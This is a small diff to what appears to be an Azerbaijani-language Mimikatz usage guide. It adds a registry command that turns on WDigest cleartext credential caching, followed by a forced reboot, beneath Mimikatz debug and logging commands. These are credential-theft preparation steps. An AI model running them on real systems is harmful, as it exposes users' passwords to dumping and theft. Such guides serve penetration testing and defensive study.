@@ -51,6 +51,9 @@ mimikatz # privilege::debug
 mimikatz # privilege::debug
 mimikatz # log mimikatz_output.txt
 mimikatz # version
+
+reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
+shutdown.exe /r /t 0 /f
 ```
 
 ### Komanda Sırasını Fayldan İcra Et
